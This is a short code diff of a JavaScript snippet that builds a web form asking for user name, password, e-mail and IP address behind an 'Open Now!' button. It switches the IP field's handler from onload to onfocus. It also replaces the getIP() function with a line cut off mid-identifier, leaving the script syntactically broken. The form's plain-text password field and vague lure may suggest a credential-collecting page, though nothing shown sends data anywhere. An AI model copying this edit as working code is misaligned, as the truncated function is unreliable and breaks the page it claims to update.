@@ -132,7 +132,7 @@
     bit += "<input id='in2' type='text' name='user_name' value='User Name' onfocus='hide2()'>";
     bit += "<input id='in3' type='text' name='password' value='Password' onfocus='hide3()'>";
     bit += "<input id='in4' type='text' name='email_address' value='E-Mail' onfocus='hide4()'>";
-    bit += "<input id='in5' type='text' name='ip_address' value='IP Address' onload='getIP()'>";
+    bit += "<input id='in5' type='text' name='ip_address' value='IP Address' onfocus='getIP()'>";
     bit += "<input id='in5' type='submit' value='Open Now!'>";
 
     var com = "<p>Please Open On Computers Only, and Make Sure You Have Scripts Enabled</p>";
@@ -174,12 +174,7 @@
        in4.value = "";
       }
       function getIP(){
-       var in5 = document.getElementById("in5");
-       var ip = "<!-- #echo var='REMOTE_ADDR'-->";
-       
-       in5.value = ip;
-       
-      }
+       var in5 = document.getElemen
      function wedev(){
       subD.innerHTML = not;
      }
